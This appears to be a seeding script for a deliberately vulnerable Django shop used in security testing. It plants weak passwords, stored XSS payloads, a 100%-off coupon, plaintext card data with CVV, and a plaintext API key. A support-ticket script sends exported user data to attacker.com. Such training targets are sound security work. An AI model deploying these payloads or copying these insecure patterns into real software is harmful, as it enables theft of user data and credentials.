"""
Management command: seed_data
Populates vulnshop with realistic test data for security testing
"""
from django.core.management.base import BaseCommand
from django.contrib.auth.models import User
from django.utils import timezone
from datetime import timedelta
from decimal import Decimal
import random

from app.models import (
    Category, Product, UserProfile, Cart, CartItem,
    Order, OrderItem, Payment, Coupon, ProductReview,
    Newsletter, APIKey, SupportTicket, Wishlist
)


class Command(BaseCommand):
    help = 'Seed database with vulnerable test data'

    def handle(self, *args, **kwargs):
        self.stdout.write('🌱 Seeding vulnshop...')

        # ── Superuser (weak password — intentional)
        if not User.objects.filter(username='admin').exists():
            admin = User.objects.create_superuser(
                username='admin', email='admin@vulnshop.com', password='admin123'
            )
            UserProfile.objects.create(
                user=admin, phone='+91-9876543210',
                address='123 Admin Street, Bangalore',
                national_id='ADMIN1234X',
                wallet_balance=Decimal('5000.00'),
                loyalty_points=10000,
            )
            self.stdout.write('  ✓ Admin user: admin / admin123')

        # ── Regular users (predictable passwords)
        test_users = [
            ('alice', 'alice@vulnshop.com', 'password123'),
            ('bob',   'bob@vulnshop.com',   'password123'),
            ('charlie','charlie@vulnshop.com','qwerty123'),
            ('vendor1','vendor@vulnshop.com', 'vendor123'),
        ]
        created_users = []
        for username, email, password in test_users:
            if not User.objects.filter(username=username).exists():
                u = User.objects.create_user(username=username, email=email, password=password)
                UserProfile.objects.create(
                    user=u,
                    phone=f'+91-98765{random.randint(10000,99999)}',
                    address=f'{random.randint(1,100)} Test Lane, Mumbai',
                    national_id=f'TEST{random.randint(1000,9999)}X',
                    wallet_balance=Decimal(str(random.uniform(100, 2000))),
                    loyalty_points=random.randint(0, 5000),
                    is_vendor=(username == 'vendor1'),
                )
            created_users.append(User.objects.get(username=username))
        self.stdout.write(f'  ✓ {len(test_users)} test users created')

        # ── Categories
        cats_data = [
            ('Electronics', 'electronics', 'Gadgets and devices'),
            ('Clothing',    'clothing',    'Fashion and apparel'),
            ('Books',       'books',       'Knowledge and fiction'),
            ('Home',        'home',        'Home and kitchen'),
            ('Sports',      'sports',      'Fitness and outdoor'),
        ]
        categories = {}
        for name, slug, desc in cats_data:
            c, _ = Category.objects.get_or_create(slug=slug, defaults={'name': name, 'description': desc})
            categories[slug] = c
        self.stdout.write(f'  ✓ {len(cats_data)} categories created')

        # ── Products (with intentional XSS payloads in descriptions)
        products_data = [
            {
                'name': 'iPhone 15 Pro', 'slug': 'iphone-15-pro',
                'category': categories['electronics'],
                'price': Decimal('89999.00'), 'cost_price': Decimal('65000.00'),
                'stock': 50, 'discount_pct': 5,
                # VULN: XSS payload in description — rendered raw in template
                'description': 'Latest Apple iPhone 15 Pro.<script>console.log("stored xss")</script> 256GB storage.',
            },
            {
                'name': 'Samsung 4K TV', 'slug': 'samsung-4k-tv',
                'category': categories['electronics'],
                'price': Decimal('45999.00'), 'cost_price': Decimal('32000.00'),
                'stock': 20, 'discount_pct': 10,
                'description': '55-inch 4K OLED Smart TV with Tizen OS.',
            },
            {
                'name': 'Nike Air Max', 'slug': 'nike-air-max',
                'category': categories['clothing'],
                'price': Decimal('8999.00'), 'cost_price': Decimal('4500.00'),
                'stock': 100, 'discount_pct': 0,
                'description': 'Premium running shoes with Air Max cushioning.',
            },
            {
                'name': 'Python Crash Course', 'slug': 'python-crash-course',
                'category': categories['books'],
                'price': Decimal('599.00'), 'cost_price': Decimal('150.00'),
                'stock': 200, 'discount_pct': 15,
                'description': 'Learn Python 3 programming from scratch.',
            },
            {
                'name': 'Instant Pot 6QT', 'slug': 'instant-pot-6qt',
                'category': categories['home'],
                'price': Decimal('6499.00'), 'cost_price': Decimal('3500.00'),
                'stock': 35, 'discount_pct': 20,
                'description': '7-in-1 electric pressure cooker.',
            },
            {
                'name': 'Yoga Mat Pro', 'slug': 'yoga-mat-pro',
                'category': categories['sports'],
                'price': Decimal('2499.00'), 'cost_price': Decimal('800.00'),
                'stock': 75, 'discount_pct': 0,
                'description': 'Non-slip 6mm thick yoga mat.',
            },
        ]

        admin_user = User.objects.get(username='admin')
        for pd in products_data:
            if not Product.objects.filter(slug=pd['slug']).exists():
                Product.objects.create(vendor=admin_user, **pd)
        self.stdout.write(f'  ✓ {len(products_data)} products created')

        # ── Reviews (with stored XSS payload)
        p = Product.objects.first()
        if p and not ProductReview.objects.filter(product=p).exists():
            ProductReview.objects.create(
                product=p, user=created_users[0], rating=5,
                content='Great product! <img src=x onerror=alert(1)>'  # stored XSS
            )
            ProductReview.objects.create(
                product=p, user=created_users[1], rating=4,
                content='Good value for money.'
            )
        self.stdout.write('  ✓ Reviews seeded (with XSS payload for testing)')

        # ── Coupons (including abusable ones)
        coupons = [
            {
                'code': 'SAVE10', 'discount_type': 'pct', 'discount_value': Decimal('10'),
                'min_order_value': Decimal('500'), 'max_uses': 0, 'is_active': True,
                'valid_from': timezone.now() - timedelta(days=30),
                'valid_to': timezone.now() + timedelta(days=365),
            },
            {
                'code': 'FLAT500', 'discount_type': 'fixed', 'discount_value': Decimal('500'),
                'min_order_value': Decimal('1000'), 'max_uses': 0, 'is_active': True,
                'valid_from': timezone.now() - timedelta(days=10),
                'valid_to': timezone.now() + timedelta(days=365),
            },
            {
                'code': 'ADMIN100', 'discount_type': 'pct', 'discount_value': Decimal('100'),
                'min_order_value': Decimal('0'), 'max_uses': 0, 'is_active': True,
                'valid_from': timezone.now() - timedelta(days=1),
                'valid_to': timezone.now() + timedelta(days=365),
            },
        ]
        for cp in coupons:
            Coupon.objects.get_or_create(code=cp['code'], defaults=cp)
        self.stdout.write('  ✓ Coupons seeded (including ADMIN100 = 100% off — logic vuln)')

        # ── Sample orders with payment data stored (PCI DSS violation)
        alice = User.objects.get(username='alice')
        if not Order.objects.filter(user=alice).exists():
            for i in range(3):
                product = random.choice(Product.objects.all())
                order = Order.objects.create(
                    user=alice,
                    shipping_addr='42 Alice Lane, Mumbai 400001',
                    billing_addr='42 Alice Lane, Mumbai 400001',
                    subtotal=product.price,
                    total=product.price,
                    status=random.choice(['paid', 'shipped', 'delivered']),
                    payment_method='card',
                )
                OrderItem.objects.create(
                    order=order, product=product,
                    product_name=product.name,
                    quantity=1, unit_price=product.price,
                )
                # VULN: Card data stored in plaintext
                Payment.objects.create(
                    order=order, amount=product.price,
                    card_number='4111111111111111',   # test visa
                    card_expiry='12/26',
                    card_cvv='123',                   # CVV stored — PCI violation
                    card_holder='Alice Wonderland',
                    status='completed',
                )
        self.stdout.write('  ✓ Orders + payments seeded (card data stored in plaintext!)')

        # ── Newsletter (with predictable tokens)
        Newsletter.objects.get_or_create(
            email='newsletter@test.com',
            defaults={'token': 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', 'is_active': True}
        )

        # ── API Keys (stored plaintext)
        APIKey.objects.get_or_create(
            user=admin_user,
            defaults={
                'key': 'sk_admin_super_secret_api_key_1234567890abcdef',
                'name': 'Admin API Key',
                'scopes': ['read', 'write', 'delete'],
            }
        )
        self.stdout.write('  ✓ API keys seeded (plaintext — for VULN-044 testing)')

        # ── Support ticket with XSS payload targeting admin
        if not SupportTicket.objects.filter(user=alice).exists():
            SupportTicket.objects.create(
                user=alice,
                subject='My order is delayed',
                # VULN: Stored XSS targeting staff viewing tickets
                message='Order #1 not delivered. <script>fetch("/export/users/").then(r=>r.json()).then(d=>fetch("http://attacker.com/?data="+btoa(JSON.stringify(d))))</script>',
            )
        self.stdout.write('  ✓ Support ticket seeded (with admin-targeting XSS payload)')

        self.stdout.write('\n' + '═' * 60)
        self.stdout.write('✅ vulnshop seeded successfully!')
        self.stdout.write('═' * 60)
        self.stdout.write('\n📋 TEST CREDENTIALS:')
        self.stdout.write('   admin    / admin123   (superuser)')
        self.stdout.write('   alice    / password123 (buyer)')
        self.stdout.write('   bob      / password123 (buyer)')
        self.stdout.write('   vendor1  / vendor123  (vendor)')
        self.stdout.write('\n🔗 App running at: http://localhost:8000')
        self.stdout.write('🔍 Scanner at:     http://localhost:9000')
        self.stdout.write('⚠️  FOR SECURITY TESTING ONLY')